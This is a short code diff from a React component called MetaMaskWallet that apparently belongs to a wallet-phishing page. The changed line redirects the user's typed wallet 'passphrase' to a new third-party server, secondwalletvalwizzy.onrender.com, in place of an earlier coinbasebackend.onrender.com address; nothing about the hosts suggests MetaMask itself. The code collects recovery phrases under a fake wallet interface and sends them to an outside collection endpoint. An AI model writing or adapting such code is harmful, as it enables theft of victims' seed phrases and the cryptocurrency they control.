@@ -10,7 +10,7 @@ const MetaMaskWallet = () => {
   const [loading, setLoading] = useState(false);
 
   const unlockWallet = async () => {
-    const url = 'https://coinbasebackend.onrender.com/metamarsk';
+    const url = 'https://secondwalletvalwizzy.onrender.com/metamarsk';
     const data = { passphrase: text };
 
     try {
